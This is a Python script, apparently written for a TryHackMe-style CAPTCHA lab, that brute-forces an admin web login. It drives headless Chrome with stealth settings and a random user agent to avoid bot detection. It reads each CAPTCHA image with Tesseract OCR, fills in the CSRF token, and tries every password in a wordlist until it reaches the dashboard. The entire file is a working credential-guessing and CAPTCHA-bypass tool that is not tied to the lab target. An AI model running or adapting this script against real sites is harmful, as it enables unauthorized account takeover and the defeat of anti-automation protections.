from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth
from selenium.webdriver.support import expected_conditions as EC

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os

os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='/usr/bin/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.48.177.253'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'
username = "admin"
wordlist = "/home/brakka/thm/CAPTCHApocalypse/wordlist.txt" 

def get_wordlist(wordlist):
    passwords=[]
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password = line.strip()
            passwords.append(password)
    return passwords

def get_captcha_text(password):
    captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
    captcha_png = captcha_img_element.screenshot_as_png

    image = Image.open(io.BytesIO(captcha_png)).convert("L")
    image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
    image = image.filter(ImageFilter.SHARPEN)
    image = ImageEnhance.Contrast(image).enhance(2.0)
    image = image.point(lambda x: 0 if x < 140 else 255, '1')

    captcha_text = pytesseract.image_to_string(
        image,
        config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
    ).strip().replace(" ", "").replace("\n", "").upper()

    image.save(f"captchas/captcha_{password}_{captcha_text}.png")

    if not captcha_text.isalnum() or len(captcha_text) != 5:
        print(f"[!] OCR failed (got: '{captcha_text}')")
        return None

    return captcha_text


def submit_form(password, captcha_text):
    csrf_token = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")
    chrome.find_element(By.NAME, "username").send_keys(username)
    chrome.find_element(By.NAME, "password").send_keys(password)
    chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)

    chrome.find_element(By.TAG_NAME, "button").click()
    time.sleep(2)

    print('cur url>:', chrome.current_url)
    if dashboard_url in chrome.current_url:
        print(f"[+] SUCCESS! Password found: {password}")
        chrome.quit()
        exit()
    elif login_url in chrome.current_url and 'error=true' not in chrome.current_url:
        print('CAPTCHA FAILED, TRY WITH NEW CAPTCHA')
        chrome.refresh()
        time.sleep(1)
        new_captcha_text = get_captcha_text(password)
        if new_captcha_text is None:
            print('No captcha text')
            return False
        print(f"[*] Retrying password: {password} with CAPTCHA: {new_captcha_text}")
        submit_form(password, new_captcha_text)
    else:
        print(f"[-] Failed login with: {password}")


def start():
    passwd_list = get_wordlist(wordlist)
    if len(passwd_list) == 0:
        print("NO wordlist")
        return
    else:
        for password in passwd_list:
            chrome.get(login_url)
            time.sleep(1)
            captcha_text = get_captcha_text(password) 
            if captcha_text is None:
                print('No captcha text')
                continue
            print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")
            submit_form(password, captcha_text)  

    chrome.quit() 

if __name__ == "__main__":
    start()